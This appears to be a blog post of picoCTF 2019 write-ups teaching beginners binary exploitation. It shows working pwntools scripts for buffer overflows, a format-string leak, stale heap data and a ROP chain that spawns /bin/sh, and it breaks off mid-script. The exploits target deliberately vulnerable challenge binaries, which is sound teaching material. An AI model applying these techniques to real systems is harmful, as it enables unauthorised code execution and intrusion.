<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=">

<!-- Begin Jekyll SEO tag v2.6.1 -->
<title>Picoctf2019 | seb-sec</title>
<meta name="generator" content="Jekyll v4.0.0" />
<meta property="og:title" content="Picoctf2019" />
<meta name="author" content="seb-sec" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Pico was a fun ctf that had a wide range of challenges, from absolute beginner to some nontrivial (for me) heap exploitation. I decided to pick out a few of these challenges from the binary exploitation category, make writeups for them and cover some basic exploitation concepts from the point of view of a beginner with only a small amount of programming experience." />
<meta property="og:description" content="Pico was a fun ctf that had a wide range of challenges, from absolute beginner to some nontrivial (for me) heap exploitation. I decided to pick out a few of these challenges from the binary exploitation category, make writeups for them and cover some basic exploitation concepts from the point of view of a beginner with only a small amount of programming experience." />
<link rel="canonical" href="http://localhost:4000/2019/10/29/post.html" />
<meta property="og:url" content="http://localhost:4000/2019/10/29/post.html" />
<meta property="og:site_name" content="seb-sec" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-10-29T00:00:00+11:00" />
<script type="application/ld+json">
{"author":{"@type":"Person","name":"seb-sec"},"description":"Pico was a fun ctf that had a wide range of challenges, from absolute beginner to some nontrivial (for me) heap exploitation. I decided to pick out a few of these challenges from the binary exploitation category, make writeups for them and cover some basic exploitation concepts from the point of view of a beginner with only a small amount of programming experience.","headline":"Picoctf2019","dateModified":"2019-10-29T00:00:00+11:00","datePublished":"2019-10-29T00:00:00+11:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2019/10/29/post.html"},"url":"http://localhost:4000/2019/10/29/post.html","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <h1>seb-sec</h1>
        <h2>Security Research</h2>

        <section id="downloads">
          
        </section>

        <section id="navigation">
          <h3><a href="/">Home</a></h3>
          <h3><a href="/about">About</a></h3>
          <h3><a href="/blog">Blog</a></h3>
          <h3><a href="/projects">Projects</a></h3>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <small>29 October 2019</small>
<h1>Picoctf2019</h1>

<p class="view">by seb-sec</p>

<p>Pico was a fun ctf that had a wide range of challenges, from absolute beginner to some nontrivial (for me) heap exploitation.</p>

<p>I decided to pick out a few of these challenges from the binary exploitation category, make writeups for them and cover some basic exploitation concepts from the point of view of a beginner with only a small amount of programming experience.</p>

<!--more-->

<h1 id="picoctf-2019--binary-exploitation">Picoctf 2019- Binary Exploitation</h1>

<h2 id="assumed-knowledge">Assumed knowledge</h2>
<ul>
  <li>Basic C programming experience and using gdb</li>
  <li>Knowledge of different parts of a running program (data, heap, stack, etc)</li>
  <li>Basic knowledge of x86 assembly (syntax, registers)</li>
  <li>Basic python knowledge</li>
</ul>

<h2 id="tools">Tools</h2>

<p>Here are some helpful tools I’ll be using to make life easier</p>
<ul>
  <li><a href="http://docs.pwntools.com/en/stable/install.html">Pwntools</a>- Python library with several features that makes exploitation less of a pain</li>
  <li><a href="https://github.com/pwndbg/pwndbg">Pwndbg</a>- gdb plugin that makes it more bearable</li>
  <li>ropper- tool used in ROP challenges later on, can be installed with <code class="highlighter-rouge">pip install ropper --user</code></li>
  <li>I would also recommend using a disassembler like <a href="https://binary.ninja/demo/">binary ninja</a> to get a better idea of how some of these programs work</li>
</ul>

<p>Lets get to the challenges, found <a href="https://2019game.picoctf.com/problems">here</a> (filter for binary exploitation only)</p>

<p>Note that for most of these challenges you will need to have a <code class="highlighter-rouge">flag.txt</code> file in the same directory as the challenge if you are running the binary locally- it can have any content you want</p>

<p><br /></p>
<hr />

<h2 id="overflow-1">Overflow 1</h2>

<p>This challenge requires us to overflow a buffer in the program and overwrite the return address on the stack to the win function. What does this mean?</p>

<p>Lets have a look at the source code they provide us.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define BUFFSIZE 64
#define FLAGSIZE 64
</span>
<span class="kt">void</span> <span class="nf">flag</span><span class="p">()</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">FLAGSIZE</span><span class="p">];</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span><span class="s">"r"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Flag File is Missing. please contact an Admin if you are running this on the shell server.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">FLAGSIZE</span><span class="p">,</span><span class="n">f</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(){</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUFFSIZE</span><span class="p">];</span>
  <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"Woah, were jumping to 0x%x !</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">get_return_address</span><span class="p">());</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Give me a string and lets see what happens: "</span><span class="p">);</span>
  <span class="n">vuln</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>

<p><br />
The <code class="highlighter-rouge">vuln()</code> function is where the magic happens. This calls <code class="highlighter-rouge">gets()</code> to put user input into the buffer buf. If you have a look at the manual entry for gets (using <code class="highlighter-rouge">man gets</code> on a Linux machine) you will see that this function can get an unbounded amount of input from the user and therefore write past the bounds of the buffer</p>

<p>This means we will start overwriting things on the stack. What does the stack look like when <code class="highlighter-rouge">vuln()</code> gets called, and how far away is the buffer from where we want to write to?</p>

<p>Here is what the stack frame for <code class="highlighter-rouge">vuln()</code> looks like:</p>

<p><br />
<img src="/assets/images/pico2019/stack.jpg" alt="stack" /></p>

<p>We can clearly see that <code class="highlighter-rouge">gets()</code> will allow us to start writing past the buffer and into important things like the return address, but how do we know how much to write, other than brute force guessing?</p>

<p>A quick look with <code class="highlighter-rouge">objdump -d</code> on the binary can give us the answer, specifically looking at the <code class="highlighter-rouge">vuln()</code> function</p>

<p><br />
<img src="/assets/images/pico2019/overflow1-objdump.jpg" alt="objdump overflow1" /></p>

<p>We see <code class="highlighter-rouge">gets</code> is called on a buffer that is 0x48 bytes from ebp. The saved return address immediately follows this ebp value in memory, and the saved ebp is 4 btytes in size, so this means that we will start writing over the return address after 0x48 + 4 = 0x4c bytes (or 76 in decimal).</p>

<p>What do we write over the return address? We are given a flag function to print the flag for us, so thats our goal. We can simply find that using <code class="highlighter-rouge">objdump</code> as above and grab the <code class="highlighter-rouge">flag()</code> function address. Heres what my solution script looked like (running the process locally).</p>

<p><br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./vuln'</span><span class="p">)</span>

<span class="n">win</span> <span class="o">=</span> <span class="mh">0x080485e6</span>

<span class="n">payload</span><span class="o">=</span><span class="n">fit</span><span class="p">({</span>
    <span class="p">(</span><span class="mh">0x48</span><span class="o">+</span><span class="mi">4</span><span class="p">):</span><span class="n">p32</span><span class="p">(</span><span class="n">win</span><span class="p">)</span>
<span class="p">})</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">':'</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></div></div>

<p><br /></p>

<p>First we tell pwntools what process we are looking at, set this to the file name of the executable you download. Next we note where the win function is and construct a payload with <code class="highlighter-rouge">fit()</code>. This function will simply insert whatever value we want at a specified place inside the payload. In this case, we put the ‘win’ address after 0x48+4 bytes- right over the return address. The <code class="highlighter-rouge">p32()</code> around win will translate that address into little-endian form, since thats how it will be read inside the program.</p>

<p>The rest of the script simply runs the program until it prompts us for user input, then sends the payload and allows us to view the results.</p>

<p><br /></p>
<hr />
<h2 id="overflow-2">Overflow 2</h2>

<p>This is a similar challenge to overflow 1, but this time we must provide some arguments to the flag function. How do we do this? Recall that arguments to a function are passed in reverse order when setting up a new stack frame, as follows:</p>

<p><img src="/assets/images/pico2019/stack-args.jpg" alt="stack-args" /></p>

<p>Therefore after overflowing and setting the return address to flag, we also need to write the arguments to the stack, in the order seen in the above diagram. We are given the source code for this challenge, and can see that arg1 = <code class="highlighter-rouge">0xdeadbeef</code> and arg2 = <code class="highlighter-rouge">0xc0ded00d</code>. We also need to put a fake return address to offset our input since the <code class="highlighter-rouge">flag()</code> function will expect a value to be there when grabbing the arguments. Opening the binary in a disassembler can provide a clearer picture:</p>

<p><br />
<img src="/assets/images/pico2019/overflow2-args.jpg" alt="dissasm-args" /></p>

<p><br />
The program gets the args from ebp+8 since it expects the return address to be at ebp+4. It doesn’t matter what value we put for this fake return address since we will get the flag by the time the function returns. In the example exploit file I chose to use ‘AAAA’</p>

<p>The rest of the problem is the same as the previous one- we can get the address of the flag function and amount to overflow by looking at the disassembly or from <code class="highlighter-rouge">objdump</code></p>

<p><br />
The final exploit script looks like this:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./overflow2'</span><span class="p">)</span>
<span class="n">win</span> <span class="o">=</span> <span class="mh">0x80485e6</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">fit</span><span class="p">({</span>
	<span class="p">(</span><span class="mh">0xb8</span><span class="o">+</span><span class="mi">4</span><span class="p">):</span><span class="n">p32</span><span class="p">(</span><span class="n">win</span><span class="p">),</span>
	<span class="p">(</span><span class="mh">0xb8</span><span class="o">+</span><span class="mi">8</span><span class="p">):</span><span class="s">'AAAA'</span><span class="p">,</span>
	<span class="p">(</span><span class="mh">0xb8</span><span class="o">+</span><span class="mi">12</span><span class="p">):</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">),</span>
	<span class="p">(</span><span class="mh">0xb8</span><span class="o">+</span><span class="mi">16</span><span class="p">):</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xc0ded00d</span><span class="p">)</span>
<span class="p">})</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">':'</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<p><br /></p>
<hr />
<h2 id="stringzz">stringzz</h2>

<p>This is a fairly straightforward format string challenge. The vulnerability arises from an inappropriate usage of <code class="highlighter-rouge">printf()</code>, which is directly passed a buffer of user input to print.</p>

<p>If printf() is passed a format string, such as <code class="highlighter-rouge">%x</code> inside the string it will assume there is a corresponding argument that has also been passed to the function. In C, you would normally do something like <code class="highlighter-rouge">printf("%s", buffer)</code>. However, if you just call <code class="highlighter-rouge">printf("%x")</code>, it will compile and run just fine. What is happening here?</p>

<p><code class="highlighter-rouge">printf()</code> will see the format specifier and expect an argument, so it will look on the stack where the argument <em>should</em> be and use the value that’s there.</p>

<p>So how do we leverage this vulnerability to solve the challenge? If we look at the source code, we find that the flag is written to a buffer supplied by a <code class="highlighter-rouge">malloc()</code> call. This buffer is a local variable in main(), so we can find it on the stack. Having a look at the disassembly confirms this:</p>

<p><br />
<img src="/assets/images/pico2019/stringzz-var.jpg" alt="stringzz-disasm" /></p>

<p>It is the final argument passed to <code class="highlighter-rouge">fgets()</code>, and exists at ebp-0x14 in main()’s stack frame. It’s important to note this is not the flag itself, but a pointer to it.</p>

<p>We have some notion that the pointer to the flag is on the stack, but at what point does our user input get passed to <code class="highlighter-rouge">printf()</code> ? It will be at the call to <code class="highlighter-rouge">printMessage3()</code>, meaning a few stack frames are set up before our format string is used. This makes it a bit tricker to figure out what input to pass to the program. Luckily, gdb is here to save the day.</p>

<p>First, we set a breakpoint on the printMessage3 function with <code class="highlighter-rouge">b printMessage3</code> inside gdb. Then we run the program, providing it with an arbitrary input for now.</p>

<p><br />
<img src="/assets/images/pico2019/stringzz-gdb1.jpg" alt="stringzz-gdb1" /></p>

<p>Now lets move through the function untill we reach the line that calls printf() at &lt;printMessage3+42&gt;. This can be done with a few uses of the next intruction (<code class="highlighter-rouge">ni</code>) command in gdb.</p>

<p>At this point we can use the command <code class="highlighter-rouge">stack</code> to see what the stack will look like at the point that printf() is called with our input</p>

<p><br />
<img src="/assets/images/pico2019/stringzz-gdb2.jpg" alt="stringzz-gdb2" /></p>

<p>The input I gave the program was simply ‘a’ in this case. Pwndbg will very kindly tell us what resides at each particular memory address, including any strings. We know the pointer to the flag is somewhere on the stack <em>below</em> us (this means towards higher addresses!), so all we need to do is inspect the stack and find it. We can see more stack entries with the command <code class="highlighter-rouge">stack {num}</code>, where num is the number of entries we want to see.</p>

<p>By looking through the stack we eventually find what we’re looking for</p>

<p><img src="/assets/images/pico2019/stringzz-gdb3.jpg" alt="stringzz-gdb3" /></p>

<p>This is the 0x25’th item on the stack, which is 37 in decimal. In order to print out the flag for us, we would need to use the <code class="highlighter-rouge">%s</code> format specifier (this will dereference the address on the stack and print out the string) on the 37th element on the stack. Fortunately format specifiers allow us to do this, in the form <code class="highlighter-rouge">%{num}$s</code>, where num refers to which argument to use for formatting.</p>

<p>Therefore our input to the program will be <code class="highlighter-rouge">%37$s</code></p>

<p><br />
<img src="/assets/images/pico2019/stringzz-final.jpg" alt="stringzz-final" /></p>

<p><br /></p>
<hr />
<h2 id="messy-malloc">messy-malloc</h2>

<p>This challenge uses a simple login system to demonstrate the dangers of not clearing your memory allocations.</p>

<p>While not required for this challenge, it would be worthwhile reading about <a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/">how the glibc allocator works</a>, particularly for some of the other heap challenges in the ctf.</p>

<p><br />
While reading through the source code, we can see that our goal is to successfully call the print_flag() function. There exists a user struct that we are allocated when attempting to login, and we have control over the size of username we are allocating as well as the contents of it. At no point do we get to set the access code field directly. The print_flag() function checks that this code is equal to some value, which we can get by placing the values from the source code into an online hexadecimal to ascii converter.</p>

<p>What we find is the code appears to be ‘ROOT_ACCESS_CODE’ but backwards. This makes sense when thinking about how this value will be stored and compared in memory on a little-endian machine.</p>

<p><br />
So how can we fill the access code field when there appears to be no way of accessing it? The answer lies in the logout function and the free chunk list it makes for us.</p>

<p>For this challenge let us just consider the existence of a single bin where memory chunks that are free’d go. Free chunks are inserted at the head of the list, and if a new allocation is made the first thing that happens is this list is traversed, with the first compatible chunk returned if found.</p>

<p><br />
What does this mean for our program? logout() will first free the user struct and <em>then</em> the username in the struct. Say we had allocated a name buffer the same size as the struct (32 bytes) and we had set our name to ‘AAAA’ for example, this is what our free chunk list would look like:</p>

<p><br />
<img src="/assets/images/pico2019/messy-malloc-list.jpg" alt="messy-malloc-list" /></p>

<p>What would happen if tried to login again?</p>

<p>The login function first attempts to allocate a user struct, which is 32 bytes long. This will look at the beginning of our free list and grab the first chunk of appropriate size, (the old username!), which <em>still has data in it</em>. No attempt is made by the program to zero out this memory, which means the allocated chunk will contain our old data- potentially over the access code field.</p>

<p><br />
Let’s have a look at this in action. We’ll first login with a username of size 32, set an appropriate username to find out if we were successful later on, logout, then login again. The username size shouldn’t matter on this second login.</p>

<p><br />
<img src="/assets/images/pico2019/messy-malloc-login.jpg" alt="messy-malloc-login" /></p>

<p>We can see that our idea was correct, and we have successfully written to the access code field in the second user struct we allocate. The output tells us that the access code field in the struct begins after 8 bytes of input- this means that the username and files fields (4 byte pointers) are placed next to each other by the compiler.</p>

<p><br />
Our path is now clear: Login and allocate a 32 byte username, where the first 8 bytes of the username can be anything, and the 16 bytes following should be the access code we found out. Then we logout which will put the username chunk with the password at the beginning of the free list. Then, we login again using an arbitrary sized username, which will allocate a user struct from the front of the free list, placing our input into the access code field.</p>

<p><br />
The exploit script looks like this:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'2019shell1.picoctf.com'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="s">'45173'</span><span class="p">)</span>

<span class="n">PASSWORD</span> <span class="o">=</span> <span class="s">'ROOT_ACCESS_CODE'</span>

<span class="k">def</span> <span class="nf">skip_menu</span><span class="p">():</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'login'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'username</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'username</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">content</span><span class="p">))</span>
    <span class="n">skip_menu</span><span class="p">()</span>

<span class="n">skip_menu</span><span class="p">()</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">8</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">PASSWORD</span>

<span class="n">login</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'logout'</span><span class="p">)</span>
<span class="n">skip_menu</span><span class="p">()</span>

<span class="n">login</span><span class="p">(</span><span class="mi">50</span><span class="p">,</span><span class="s">'a'</span><span class="p">)</span> 	<span class="c1"># size field doesnt matter here
</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'print-flag'</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></div></div>

<p><br />
<img src="/assets/images/pico2019/messy-malloc-final.jpg" alt="messy-malloc-final" /></p>

<p><br /></p>
<hr />

<h2 id="rop32">rop32</h2>

<p>This challenge requires knowledge of Return Oriented Programming (ROP), with the goal being to get a shell (and use that to read the flag file).</p>

<p>First let’s go over the basics of what ROP is and why it’s useful.</p>

<p><br />
Assuming we start with a classic buffer overflow vulnerability in a program, how do we usually leverage this to get control of the program? We can divert execution to a (win) function or divert execution to a buffer on the stack with our code in it.</p>

<p>Mitigations such as a non-executable stack (NX) and exclusion of win functions limit the effectiveness of such exploits, so we need something different.</p>

<p><br />
A buffer overflow allows us to jump to an address of our choice and start executing instructions there (assuming it is an executable region). Wouldn’t it be nice if we could execute some useful instructions, keep control of program execution, execute some more useful instructions, and continue- eventually setting up some useful functionality such as popping a shell, reading from a file etc.</p>

<p>As you might imagine, this is possible. The functionality we seek is simply a series of instructions performed in some specific order. If we manage to jump execution to a useful block of code- specifically, a block a of code that ends with a <code class="highlighter-rouge">ret</code> or similar instruction, we could keep control of program execution. This special block of code that ends with a <code class="highlighter-rouge">ret</code> is called a gadget.</p>

<p>This concept is best shown with a diagram. Say we had control of the return address of a stack frame and we wanted to execute 3 gadgets in order to set up some favourable functionality. We would set up our ROP chain (a bunch of gadgets following each other) by putting the address of the first gadget over the return address on the stack, followed by addresses of the second and third gadget respectively. 
<br /></p>

<p><img src="/assets/images/pico2019/rop32-stack.jpg" alt="rop32-stack" /></p>

<p><br />
When it comes time to return from the function, the stack pointer is set to the base pointer of thecurrent stack frame, the old base pointer is popped off the stack (this sets the stack pointer to the saved return address), and then <code class="highlighter-rouge">ret</code> is called, which just performs a <code class="highlighter-rouge">pop eip</code>. This puts the address of our first gadget into the instruction pointer register and sets the stack pointer to point to the address of our second gadget.</p>

<p>The program will then execute whatever instructions are at our first gadget and perform a <code class="highlighter-rouge">ret</code>. The stack pointer is still pointing at the address to our second gadget, so that will be placed in <code class="highlighter-rouge">eip</code> and the stack pointer will point to the address of our third gadget. The program executes the instructions of the second gadget, eventually performing a <code class="highlighter-rouge">ret</code>… you can see where this is going.</p>

<p><br /></p>
<h3 id="an-aside">An aside</h3>

<p>When looking at gadgets and trying to construct the functionality we want, we have to be careful when thinking about the instructions we want to execute, particularly their effects on the stack pointer, since this is what allows for execution of our ROP chain.</p>

<p>For example, a common gadget you will probably want to use is a <code class="highlighter-rouge">pop</code> followed by a <code class="highlighter-rouge">ret</code>, allowing you to put an arbitrary value into a register (an example of such a gadget would be <code class="highlighter-rouge">pop eax; ret;</code>). <code class="highlighter-rouge">pop</code> will place the value currently pointed to by <code class="highlighter-rouge">esp</code> into the specified register but it will also change <code class="highlighter-rouge">esp</code> in the process! In our ROP chain we would have to put the value we want to end up in the register after the address of the gadget, demonstrated below:</p>

<p><br /></p>

<p><img src="/assets/images/pico2019/rop32-pop.jpg" alt="rop32-pop" /></p>

<p><br />
Always consider the effects of instructions in your ROP chain!</p>

<p><br />
Another consideration to make has to do with the addresses of your gadgets. Sometimes when constructing your payload one of the gadget addresses may contain <code class="highlighter-rouge">\x0a</code>, which is the newline character <code class="highlighter-rouge">\n</code>. This might terminate your input to the program early. For example, the <code class="highlighter-rouge">fgets()</code> function stops reading after EOF or a newline. This means any part of your payload after this newline character would be discarded, leaving you with an incomplete ROP chain. In such a case you would need to look for replacement gadgets.</p>

<h3 id="on-to-the-challenge">On to the challenge</h3>

<p>Looking at the challenge hints tells us the goal of this challenge is to get a shell. One way to do this is to set up an <code class="highlighter-rouge">execve()</code> system call with appropriate arguments, which is what we’ll try to do.</p>

<p>Fortunately the challenge authors give us a very large binary, meaning lots of potential gadgets to use.</p>

<p>To know how to set up an appropriate <code class="highlighter-rouge">execve()</code> syscall, we have a look at <a href="http://syscalls.kernelgrok.com/">this reference table</a>, looking for sys_execve. This tells what arguments to put in what registers, and we can look at <code class="highlighter-rouge">man 2 execve</code> to see the meaning of these arguments.</p>

<p>The first argument is placed in <code class="highlighter-rouge">ebx</code> and is the pointer to the filename we want to run, in our case <code class="highlighter-rouge">/bin/sh\0</code>, the second argument is a pointer to a list of arguments to the file in <code class="highlighter-rouge">ecx</code> and the third is a list of environment variables in <code class="highlighter-rouge">edx</code>.  For our purposes, both these lists will be <code class="highlighter-rouge">NULL</code>. Additionally, we need to put the syscall number of 0xb into <code class="highlighter-rouge">eax</code>, and after all of this we execute the syscall by calling the instruction <code class="highlighter-rouge">int 0x80</code>.</p>

<p><br />
So how do we find our gadgets? <code class="highlighter-rouge">ropper</code> is a helpful tool that searches for gadgets within a binary. We can search through a file for specific gadgets by with commands in the form <code class="highlighter-rouge">ropper -f {file} --search "{gadget}"</code>. This also support wildcard searches with <code class="highlighter-rouge">???</code>- for example, if we wanted a <code class="highlighter-rouge">pop</code> into any register, we could do something like <code class="highlighter-rouge">ropper -f rop32 --search "pop ???; ret;"</code></p>

<p><br />
To solve the challenge, all we need to do is place all of our required gadgets in the correct order to construct our call to <code class="highlighter-rouge">execve</code>.</p>

<p>However, a big question is how we get a pointer to the string <code class="highlighter-rouge">/bin/sh</code>. This string doesn’t exist by itself in the binary, so we have to write it somewhere we can get a pointer to. We could write it in the buffer before we overflow it, but ASLR is enabled so we would need a stack leak to locate it. Let’s search through the segments in the program using gdb and <code class="highlighter-rouge">vmmap</code>:</p>

<p><img src="/assets/images/pico2019/rop32-segments.jpg" alt="rop32-segments" /></p>

<p>Other than the stack, only the heap and the data segment are writable. We don’t have access to any <code class="highlighter-rouge">malloc()</code> allocated memory in the program, so the only option left is the data segment. We are assisted by the fact that there this is no PIE enabled, so we don’t need a leak to find the data segment.</p>

<p><br />
Writing to this is done by calling <code class="highlighter-rouge">mov dword ptr [eax], ebx</code> type instructions with appropriate values put into registers. Note these registers are 4 bytes large, so we can only write half of the <code class="highlighter-rouge">/bin/sh\0</code> at a time.</p>

<p>We now have all the tools needed to complete this challenge.</p>

<p>The final exploit:
<br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">'./vuln-rop32'</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'?</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">28</span>
<span class="n">data_addr</span> <span class="o">=</span> <span class="mh">0x80d8000</span>

<span class="c1"># write /bin/sh to data segment
# pop edx; ret;
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0806ee6b</span><span class="p">)</span> <span class="o">+</span> <span class="s">'/bin'</span>
<span class="c1"># mov eax, edx; ret;
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08064784</span><span class="p">)</span>
<span class="c1"># pop edx; ret;
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0806ee6b</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">data_addr</span><span class="p">)</span>
<span class="c1"># mov dword ptr [edx], eax; ret
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08056e65</span><span class="p">)</span>

<span class="c1"># pop edx; ret;
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0806ee6b</span><span class="p">)</span> <span class="o">+</span> <span class="s">'/sh</span><span class="se">\0</span><span class="s">'</span>
<span class="c1"># mov eax, edx; ret;
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08064784</span><span class="p">)</span>
<span class="c1"># pop edx; ret;
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0806ee6b</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">data_addr</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span>
<span class="c1"># mov dword ptr [edx], eax; ret
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08056e65</span><span class="p">)</span>

<span class="c1"># set up syscall arguments
</span>
<span class="c1"># set eax = 0xb
# pop edx;
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0806ee6b</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xb</span><span class="p">)</span>
<span class="c1"># mov eax, edx; ret;
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08064784</span><span class="p">)</span>

<span class="c1"># set ebx = /bin/sh pointer
# pop ebx; ret
